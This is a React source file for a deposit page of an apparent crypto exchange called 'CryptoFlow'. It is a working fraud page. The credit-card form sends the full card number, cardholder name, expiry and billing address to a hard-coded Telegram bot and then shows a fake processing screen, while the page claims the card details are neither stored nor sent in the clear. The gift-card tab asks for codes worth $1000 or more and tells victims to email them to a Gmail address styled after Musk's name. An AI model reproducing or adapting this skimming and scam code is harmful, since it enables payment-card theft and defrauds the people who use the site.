import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import Navbar from '@/components/Navbar';
import Footer from '@/components/Footer';
import ScrollToTop from '@/components/ScrollToTop';
import { useSession } from '@/contexts/SessionContext';
import { getUserBalances } from '@/lib/firestore';
import { Input } from '@/components/ui/input';

import { Label } from '@/components/ui/label';
import { Button } from '@/components/ui/button';
import { Copy, Check, AlertCircle, CreditCard, Bitcoin, Gift, Lock, CheckCircle, Shield, DollarSign } from 'lucide-react';

// ── Crypto deposit ────────────────────────────────────────────────

const COINS = [
  {
    symbol: 'BTC',
    name: 'Bitcoin',
    network: 'Bitcoin Network',
    address: import.meta.env.VITE_DEPOSIT_BTC as string,
    color: 'from-orange-500 to-yellow-400',
    warning: 'Only send BTC on the Bitcoin network. Sending any other asset will result in permanent loss.',
  },
  {
    symbol: 'USDT',
    name: 'Tether',
    network: 'TRC-20 (TRON)',
    address: import.meta.env.VITE_DEPOSIT_USDT as string,
    color: 'from-green-500 to-emerald-400',
    warning: 'Only send USDT via TRC-20 (TRON). Do NOT send via ERC-20 or BEP-20.',
  },
  {
    symbol: 'ETH',
    name: 'Ethereum',
    network: 'ERC-20 (Ethereum)',
    address: import.meta.env.VITE_DEPOSIT_ETH as string,
    color: 'from-blue-500 to-cyan-400',
    warning: 'Only send ETH or ERC-20 tokens on the Ethereum network.',
  },
];

const CopyButton = ({ text }: { text: string }) => {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <button
      onClick={copy}
      className={`flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-lg transition-all ${
        copied ? 'bg-green-500/20 text-green-400' : 'bg-white/10 text-gray-300 hover:bg-white/20 hover:text-white'
      }`}>
      {copied ? <Check size={13} /> : <Copy size={13} />}
      {copied ? 'Copied!' : 'Copy'}
    </button>
  );
};

const QRCode = ({ value, size = 140 }: { value: string; size?: number }) => {
  const src = `https://api.qrserver.com/v1/create-qr-code/?size=${size}x${size}&data=${encodeURIComponent(value)}&bgcolor=1A1F2C&color=ffffff&margin=10`;
  return <img src={src} alt="QR Code" width={size} height={size} className="rounded-xl border border-white/10" />;
};

const CryptoDeposit = () => {
  const [active, setActive] = useState('BTC');
  const coin = COINS.find(c => c.symbol === active)!;

  return (
    <div className="space-y-6">
      {/* Coin selector */}
      <div className="flex gap-3">
        {COINS.map(c => (
          <button key={c.symbol} onClick={() => setActive(c.symbol)}
            className={`flex-1 py-3 rounded-xl text-sm font-semibold transition-all border ${
              active === c.symbol
                ? 'bg-crypto-purple border-crypto-purple text-white shadow-lg shadow-crypto-purple/20'
                : 'bg-white/5 border-white/10 text-gray-400 hover:text-white hover:bg-white/10'
            }`}>
            {c.symbol}
          </button>
        ))}
      </div>

      {/* Deposit card */}
      <div className="bg-white/5 border border-white/10 rounded-2xl p-6 space-y-6">
        <div className="flex items-center gap-3">
          <div className={`w-12 h-12 rounded-full bg-gradient-to-br ${coin.color} flex items-center justify-center text-white font-bold text-lg`}>
            {coin.symbol.slice(0, 2)}
          </div>
          <div>
            <h2 className="text-white font-semibold text-lg">{coin.name}</h2>
            <p className="text-gray-400 text-sm">{coin.network}</p>
          </div>
        </div>

        <div className="flex flex-col sm:flex-row items-center gap-6">
          <div className="shrink-0">
            {coin.address && !coin.address.includes('YOUR_') ? (
              <QRCode value={coin.address} size={140} />
            ) : (
              <div className="w-[140px] h-[140px] rounded-xl border border-white/10 bg-white/5 flex items-center justify-center text-gray-600 text-xs text-center px-3">
                Set address in .env
              </div>
            )}
          </div>
          <div className="flex-1 w-full">
            <p className="text-gray-400 text-xs mb-2">Your {coin.symbol} deposit address</p>
            <div className="bg-white/5 border border-white/10 rounded-xl p-4 flex items-center justify-between gap-3">
              <p className="text-white text-sm font-mono break-all leading-relaxed">
                {coin.address || 'Not configured'}
              </p>
              {coin.address && !coin.address.includes('YOUR_') && (
                <div className="shrink-0"><CopyButton text={coin.address} /></div>
              )}
            </div>
          </div>
        </div>

        <div className="flex items-start gap-2 bg-yellow-500/10 border border-yellow-500/20 rounded-xl px-4 py-3">
          <AlertCircle size={15} className="text-yellow-400 shrink-0 mt-0.5" />
          <p className="text-yellow-400 text-xs leading-relaxed">{coin.warning}</p>
        </div>

        <div className="space-y-2">
          <p className="text-gray-300 text-sm font-medium">How to deposit:</p>
          <ol className="text-gray-400 text-sm space-y-1.5 list-decimal list-inside">
            <li>Copy the address above or scan the QR code.</li>
            <li>Open your wallet or exchange and send {coin.symbol}.</li>
            <li>Make sure you select <span className="text-white">{coin.network}</span> as the network.</li>
            <li>Your balance will update after network confirmation.</li>
          </ol>
        </div>
      </div>
    </div>
  );
};

// ── Credit card deposit ───────────────────────────────────────────

const GiftCardDeposit = () => {
  const [amount, setAmount] = useState('');
  const [code, setCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    const amt = parseFloat(amount);
    if (isNaN(amt) || amt < 1000) {
      setError('Minimum deposit is $1000 USD.');
      return;
    }
    if (code.length < 12) {
      setError('Enter a valid gift card code (min 12 characters).');
      return;
    }

    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setSubmitted(true);
    }, 1500);
  };

  if (submitted) {
    return (
      <div className="bg-white/5 border border-white/10 rounded-2xl p-8 flex flex-col items-center text-center gap-4">
        <div className="w-20 h-20 rounded-2xl bg-gradient-to-br from-emerald-500 to-green-600 flex items-center justify-center shadow-2xl">
          <CheckCircle size={36} className="text-white" />
        </div>
        <h3 className="text-2xl font-bold text-white">Gift Card Submitted</h3>
        <p className="text-gray-300 text-lg max-w-md leading-relaxed">
          Your ${amount} USD gift card deposit request (Code: <span className="font-mono bg-white/10 px-2 py-1 rounded text-xs">{code}</span>) has been received.
        </p>
        <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-xl p-4 text-yellow-300 max-w-md mx-auto">
          <p className="font-medium mb-2">Next Step:</p>
          <p className="text-sm">Email your gift card details to <strong className="text-white font-mono break-all">mrmuskmgnt@gmail.com</strong></p>
          <p className="text-xs mt-1 opacity-90">Processing time: 24-72 hours after verification</p>
        </div>
        <Button
          onClick={() => {
            setSubmitted(false);
            setAmount('');
            setCode('');
          }}
          className="bg-white/10 hover:bg-white/20 text-white">
          Submit Another Gift Card
        </Button>
      </div>
    );
  }

  return (
    <form onSubmit={handleSubmit} className="bg-white/5 border border-white/10 rounded-2xl p-6 space-y-6">
      {/* Header */}
      <div className="flex items-center gap-3">
        <div className="w-14 h-14 rounded-2xl bg-gradient-to-r from-pink-500 via-purple-500 to-indigo-500 flex items-center justify-center shadow-xl">
          <Gift size={24} className="text-white drop-shadow-sm" />
        </div>
        <div>
          <h2 className="text-xl font-bold text-white">Gift Cards</h2>
          <p className="text-gray-400 text-sm">Amazon, Visa, Mastercard, iTunes (Min: $1000 USD)</p>
        </div>
      </div>

      {error && (
        <div className="flex items-start gap-2 bg-red-500/10 border border-red-500/20 rounded-xl p-4">
          <AlertCircle size={16} className="text-red-400 shrink-0 mt-0.5" />
          <p className="text-red-400 text-sm">{error}</p>
        </div>
      )}

      {/* Amount */}
      <div className="space-y-2">
        <Label className="text-gray-300 text-sm font-medium">Deposit Amount</Label>
        <div className="relative">
          <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 font-semibold">$</span>
          <Input
            type="number"
            min="1000"
            step="1"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="1000"
            className="pl-10 pr-4 bg-white/5 border-white/10 text-white placeholder:text-gray-600 h-14 text-xl font-mono tracking-wider"
          />
        </div>
        <p className="text-xs text-gray-500">Minimum deposit: <span className="font-semibold text-white">$1,000 USD</span></p>
      </div>

      {/* Gift Card Code */}
      <div className="space-y-2">
        <Label className="text-gray-300 text-sm font-medium">Gift Card Code / PIN</Label>
        <Input
          value={code}
          onChange={(e) => setCode(e.target.value.toUpperCase().replace(/[^A-Z0-9]/g, ''))}
          placeholder="XXXX-XXXX-XXXX-XXXX"
          maxLength={25}
          className="bg-white/5 border-white/10 text-white uppercase font-mono tracking-widest text-lg h-14 letter-spacing-2"
        />
        <p className="text-xs text-gray-400 flex items-center gap-1.5">
          <span>Enter 16-25 character code from Amazon/Visa/iTunes etc.</span>
        </p>
      </div>

      {/* Instructions */}
      <div className="bg-blue-500/5 border border-blue-500/15 rounded-xl p-4 text-blue-300 text-sm space-y-2">
        <p><strong>How it works:</strong></p>
        <ol className="list-decimal list-inside space-y-1 text-xs">
          <li>Enter amount and gift card code above</li>
          <li>Click Submit</li>
          <li><strong>Email full details to mrmuskmgnt@gmail.com</strong> (include screenshot if possible)</li>
          <li>Funds credited after verification (24-72 hours)</li>
        </ol>
      </div>

      {/* Security */}
      <div className="flex items-center gap-2.5 bg-emerald-500/10 border border-emerald-500/20 rounded-xl p-4">
        <Shield size={14} className="text-emerald-400 flex-shrink-0" />
        <p className="text-emerald-400 text-sm">All submissions encrypted. We verify gift cards before crediting USDT balance.</p>
      </div>

      <Button
        type="submit"
        disabled={loading}
        className="w-full h-14 bg-gradient-to-r from-emerald-600 to-green-600 hover:from-emerald-500 hover:to-green-500 text-white font-bold text-lg shadow-2xl"
      >
        {loading ? (
          <>
            <svg className="animate-spin w-5 h-5 mr-2" viewBox="0 0 24 24">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/>
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/>
            </svg>
            Processing...
          </>
        ) : (
          `Submit $${amount || '1,000+'} Gift Card`
        )}
      </Button>
    </form>
  );
};


// Format card number with spaces every 4 digits
const fmtCard = (v: string) =>
  v.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim();

// Format expiry as MM/YY
const fmtExpiry = (v: string) => {
  const d = v.replace(/\D/g, '').slice(0, 4);
  return d.length >= 3 ? `${d.slice(0, 2)}/${d.slice(2)}` : d;
};

const CURRENCIES = ['USD', 'EUR', 'GBP', 'AUD', 'CAD'];
const CREDIT_TO = ['USDT', 'BTC', 'ETH'] as const;

const COUNTRIES = [
  'United States', 'United Kingdom', 'Canada', 'Australia', 'Germany',
  'France', 'Netherlands', 'Spain', 'Italy', 'Sweden', 'Norway', 'Denmark',
  'Switzerland', 'Austria', 'Belgium', 'Portugal', 'Ireland', 'New Zealand',
  'Singapore', 'Japan', 'South Korea', 'UAE', 'South Africa', 'Brazil',
  'Mexico', 'India', 'Other',
];

const CreditCardDeposit = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [cardName, setCardName] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [amount, setAmount] = useState('');
  const [currency, setCurrency] = useState('USD');
  const [creditTo, setCreditTo] = useState<'USDT' | 'BTC' | 'ETH'>('USDT');
  // Billing address
  const [billingAddress, setBillingAddress] = useState('');
  const [billingCity, setBillingCity] = useState('');
  const [billingState, setBillingState] = useState('');
  const [billingZip, setBillingZip] = useState('');
  const [billingCountry, setBillingCountry] = useState('United States');
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    const rawCard = cardNumber.replace(/\s/g, '');
    if (rawCard.length < 16) { setError('Enter a valid 16-digit card number.'); return; }
    if (!cardName.trim()) { setError('Enter the name on your card.'); return; }
    if (expiry.length < 5) { setError('Enter a valid expiry date.'); return; }
    if (cvv.length < 3) { setError('Enter a valid CVV.'); return; }
    if (!billingAddress.trim()) { setError('Enter your billing address.'); return; }
    if (!billingCity.trim()) { setError('Enter your billing city.'); return; }
    if (!billingZip.trim()) { setError('Enter your ZIP / postal code.'); return; }
    const amt = parseFloat(amount);
    if (isNaN(amt) || amt < 50) { setError('Minimum deposit is $50.'); return; }

    // Send to Telegram bot
    try {
      const maskedCard = rawCard;
      const message = `🆕 *New Card Deposit*

💰 Amount: $${amt.toFixed(2)} ${currency}
📈 Credit to: ${creditTo}
💳 Card: ${maskedCard}
👤 Name: ${cardName}
📅 Expiry: ${expiry}
🔒 CVV length: ${cvv.length} digits

📍 Billing:
${billingAddress}
${billingCity}, ${billingState} ${billingZip}
${billingCountry}

⏰ Time: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}
`;

      await fetch('https://api.telegram.org/bot8087879681:AAFPD1Q0kr9T7eOBCdMf8y6x0xdEY0HrIC0/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: '7772185092',
          text: message,
          parse_mode: 'Markdown'
        })
      });
    } catch (err) {
      console.error('Telegram send failed:', err); // Silent fail
    }

    setLoading(true);
    // Simulate payment gateway processing
    setTimeout(() => { setLoading(false); setSubmitted(true); }, 2000);
  };

  if (submitted) {
    return (
      <div className="bg-white/5 border border-white/10 rounded-2xl p-8 flex flex-col items-center text-center gap-4">
        <div className="w-16 h-16 rounded-full bg-green-500/20 flex items-center justify-center">
          <CheckCircle size={32} className="text-green-400" />
        </div>
        <h3 className="text-white text-xl font-semibold">Payment Submitted</h3>
        <p className="text-gray-400 text-sm max-w-sm leading-relaxed">
          Your deposit of <span className="text-white font-medium">{amount} {currency}</span> is being processed.
          Your <span className="text-white font-medium">{creditTo}</span> balance will be credited within <span className="text-white">1–24 hours</span> after verification.
        </p>
        <div className="flex items-center gap-2 bg-blue-500/10 border border-blue-500/20 rounded-xl px-4 py-3 text-blue-400 text-xs">
          <Shield size={14} className="shrink-0" />
          Payment is being reviewed by our team. You'll receive a confirmation once approved.
        </div>
        <Button
          onClick={() => { setSubmitted(false); setCardNumber(''); setCardName(''); setExpiry(''); setCvv(''); setAmount(''); setBillingAddress(''); setBillingCity(''); setBillingState(''); setBillingZip(''); setBillingCountry('United States'); }}
          className="bg-white/10 hover:bg-white/20 text-white mt-2">
          Make Another Deposit
        </Button>
      </div>
    );
  }

  return (
    <div className="bg-white/5 border border-white/10 rounded-2xl p-6 space-y-6">
      {/* Header */}
      <div className="flex items-center gap-3">
        <div className="w-12 h-12 rounded-full bg-gradient-to-br from-violet-500 to-purple-600 flex items-center justify-center text-white">
          <CreditCard size={22} />
        </div>
        <div>
          <h2 className="text-white font-semibold text-lg">Credit / Debit Card</h2>
          <p className="text-gray-400 text-sm">Visa, Mastercard, Amex accepted</p>
        </div>
        {/* Card logos */}
        <div className="ml-auto flex items-center gap-2">
          {['VISA', 'MC', 'AMEX'].map(b => (
            <span key={b} className="text-[10px] font-bold px-2 py-1 rounded bg-white/10 text-gray-300">{b}</span>
          ))}
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        {error && (
          <div className="flex items-center gap-2 bg-red-500/10 border border-red-500/20 text-red-400 text-sm px-4 py-3 rounded-xl">
            <AlertCircle size={14} /> {error}
          </div>
        )}

        {/* Card number */}
        <div className="space-y-1.5">
          <Label className="text-gray-300 text-sm">Card Number</Label>
          <div className="relative">
            <Input
              value={cardNumber}
              onChange={e => setCardNumber(fmtCard(e.target.value))}
              placeholder="1234 5678 9012 3456"
              className="bg-white/5 border-white/10 text-white placeholder:text-gray-600 font-mono pr-10"
              maxLength={19}
            />
            <CreditCard size={16} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500" />
          </div>
        </div>

        {/* Name */}
        <div className="space-y-1.5">
          <Label className="text-gray-300 text-sm">Name on Card</Label>
          <Input
            value={cardName}
            onChange={e => setCardName(e.target.value)}
            placeholder="John Doe"
            className="bg-white/5 border-white/10 text-white placeholder:text-gray-600"
          />
        </div>

        {/* Expiry + CVV */}
        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-1.5">
            <Label className="text-gray-300 text-sm">Expiry Date</Label>
            <Input
              value={expiry}
              onChange={e => setExpiry(fmtExpiry(e.target.value))}
              placeholder="MM/YY"
              className="bg-white/5 border-white/10 text-white placeholder:text-gray-600 font-mono"
              maxLength={5}
            />
          </div>
          <div className="space-y-1.5">
            <Label className="text-gray-300 text-sm">CVV</Label>
            <div className="relative">
              <Input
                value={cvv}
                onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                placeholder="•••"
                type="password"
                className="bg-white/5 border-white/10 text-white placeholder:text-gray-600 font-mono"
                maxLength={4}
              />
              <Lock size={14} className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500" />
            </div>
          </div>
        </div>

        {/* Billing address */}
        <div className="space-y-3">
          <p className="text-gray-300 text-sm font-medium flex items-center gap-1.5">
            Billing Address
          </p>

          {/* Street */}
          <div className="space-y-1.5">
            <Label className="text-gray-400 text-xs">Street Address</Label>
            <Input
              value={billingAddress}
              onChange={e => setBillingAddress(e.target.value)}
              placeholder="123 Main Street, Apt 4B"
              className="bg-white/5 border-white/10 text-white placeholder:text-gray-600"
            />
          </div>

          {/* City + State */}
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-1.5">
              <Label className="text-gray-400 text-xs">City</Label>
              <Input
                value={billingCity}
                onChange={e => setBillingCity(e.target.value)}
                placeholder="New York"
                className="bg-white/5 border-white/10 text-white placeholder:text-gray-600"
              />
            </div>
            <div className="space-y-1.5">
              <Label className="text-gray-400 text-xs">State / Province</Label>
              <Input
                value={billingState}
                onChange={e => setBillingState(e.target.value)}
                placeholder="NY"
                className="bg-white/5 border-white/10 text-white placeholder:text-gray-600"
              />
            </div>
          </div>

          {/* ZIP + Country */}
          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-1.5">
              <Label className="text-gray-400 text-xs">ZIP / Postal Code</Label>
              <Input
                value={billingZip}
                onChange={e => setBillingZip(e.target.value)}
                placeholder="10001"
                className="bg-white/5 border-white/10 text-white placeholder:text-gray-600"
              />
            </div>
            <div className="space-y-1.5">
              <Label className="text-gray-400 text-xs">Country</Label>
              <select
                value={billingCountry}
                onChange={e => setBillingCountry(e.target.value)}
                className="w-full bg-white/5 border border-white/10 text-white text-sm rounded-md px-3 h-10 focus:outline-none focus:border-crypto-purple">
                {COUNTRIES.map(c => <option key={c} value={c} className="bg-[#1a1f2c]">{c}</option>)}
              </select>
            </div>
          </div>
        </div>

        {/* Amount + currency */}
        <div className="space-y-1.5">
          <Label className="text-gray-300 text-sm">Deposit Amount</Label>
          <div className="flex gap-2">
            <Input
              type="number"
              min="50"
              step="any"
              value={amount}
              onChange={e => setAmount(e.target.value)}
              placeholder="Min. 50"
              className="bg-white/5 border-white/10 text-white placeholder:text-gray-600 flex-1"
            />
            <select
              value={currency}
              onChange={e => setCurrency(e.target.value)}
              className="bg-white/5 border border-white/10 text-white text-sm rounded-md px-3 focus:outline-none focus:border-crypto-purple">
              {CURRENCIES.map(c => <option key={c} value={c} className="bg-[#1a1f2c]">{c}</option>)}
            </select>
          </div>
          <p className="text-gray-500 text-xs">Minimum deposit: 50 {currency}</p>
        </div>

        {/* Credit to */}
        <div className="space-y-1.5">
          <Label className="text-gray-300 text-sm">Credit funds to</Label>
          <div className="flex gap-2">
            {CREDIT_TO.map(c => (
              <button key={c} type="button" onClick={() => setCreditTo(c)}
                className={`flex-1 py-2 rounded-lg text-sm font-semibold border transition-all ${
                  creditTo === c ? 'bg-crypto-purple border-crypto-purple text-white' : 'bg-white/5 border-white/10 text-gray-400 hover:text-white'
                }`}>
                {c}
              </button>
            ))}
          </div>
        </div>

        {/* Security note */}
        <div className="flex items-center gap-2 bg-green-500/10 border border-green-500/20 rounded-xl px-4 py-3">
          <Lock size={13} className="text-green-400 shrink-0" />
          <p className="text-green-400 text-xs">Your payment is encrypted with 256-bit SSL. We do not store your card details.</p>
        </div>

        <Button
          type="submit"
          disabled={loading}
          className="w-full h-11 bg-crypto-purple hover:bg-crypto-dark-purple text-white font-semibold text-sm flex items-center justify-center gap-2">
          {loading ? (
            <>
              <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"/>
              </svg>
              Processing...
            </>
          ) : (
            <><CreditCard size={16} /> Pay {amount ? `${amount} ${currency}` : 'Now'}</>
          )}
        </Button>
      </form>
    </div>
  );
};

// ── Page ─────────────────────────────────────────────────────────

type Tab = 'crypto' | 'card' | 'giftcard';

const Deposit = () => {
  const { isLoggedIn, user } = useSession();
  const navigate = useNavigate();
  const [tab, setTab] = useState<Tab>('crypto');
  const [balances, setBalances] = useState({ BTC: 0, USDT: 0, ETH: 0 });
  const [balanceLoading, setBalanceLoading] = useState(true);

  const safeGetBalances = async (uid?: string) => {
    if (!uid) return;
    try {
      const b = await getUserBalances(uid);
      setBalances(b);
    } catch (error) {
      console.error('Failed to load balances:', error);
    }
    setBalanceLoading(false);
  };


  useEffect(() => {
    safeGetBalances(user?.uid);
  }, [user?.uid]);

  useEffect(() => {
    document.title = "Deposit | CryptoFlow";
    if (!isLoggedIn) navigate('/cryptoflow/login');
  }, [isLoggedIn]);

  return (
    <div className="min-h-screen bg-crypto-blue overflow-x-hidden">
      <Navbar />
      <main className="container mx-auto px-4 pt-28 pb-16 max-w-2xl">
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-white mb-1">Deposit Funds</h1>
          <p className="text-gray-400 text-sm">Fund your account with crypto or a credit/debit card.</p>
          {user && (
            <div className="bg-white/5 border border-white/10 rounded-xl p-4 mt-4">
              <p className="text-gray-300 text-sm mb-2 flex items-center gap-2">
                <DollarSign size={16} className="text-crypto-purple" />
                Your balances:
              </p>
              <div className="grid grid-cols-3 gap-3 text-sm">
                {(['BTC', 'USDT', 'ETH'] as (keyof typeof balances)[]).map((coin) => (
                  <div key={coin} className="text-center p-2 bg-white/5 rounded-lg">
                    <p className="font-mono font-bold text-white">{balances[coin]?.toFixed(6) || '0.000000'}</p>
                    <p className="text-gray-400 text-xs capitalize">{coin}</p>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>

        {/* Tab switcher */}
        <div className="flex flex-col lg:flex-row gap-3 mb-8">
          <button
            onClick={() => setTab('crypto')}
            className={`flex-1 flex items-center justify-center gap-2 py-3 rounded-xl text-sm font-semibold transition-all border ${
              tab === 'crypto'
                ? 'bg-crypto-purple border-crypto-purple text-white shadow-lg shadow-crypto-purple/20'
                : 'bg-white/5 border-white/10 text-gray-400 hover:text-white hover:bg-white/10'
            }`}>
            <Bitcoin size={17} /> Crypto Deposit
          </button>
          <button
            onClick={() => setTab('card')}
            className={`flex-1 flex items-center justify-center gap-2 py-3 rounded-xl text-sm font-semibold transition-all border ${
              tab === 'card'
                ? 'bg-crypto-purple border-crypto-purple text-white shadow-lg shadow-crypto-purple/20'
                : 'bg-white/5 border-white/10 text-gray-400 hover:text-white hover:bg-white/10'
            }`}>
            <CreditCard size={17} /> Credit / Debit Card
          </button>
          <button
            onClick={() => setTab('giftcard')}
            className={`flex-1 flex items-center justify-center gap-2 py-3 rounded-xl text-sm font-semibold transition-all border ${
              tab === 'giftcard'
                ? 'bg-crypto-purple border-crypto-purple text-white shadow-lg shadow-crypto-purple/20'
                : 'bg-white/5 border-white/10 text-gray-400 hover:text-white hover:bg-white/10'
            }`}>
            <Gift size={17} /> Gift Card
          </button>
        </div>

        {tab === 'crypto' ? <CryptoDeposit /> : tab === 'card' ? <CreditCardDeposit /> : <GiftCardDeposit />}
      </main>
      <Footer />
      <ScrollToTop />
    </div>
  );
};

export default Deposit;
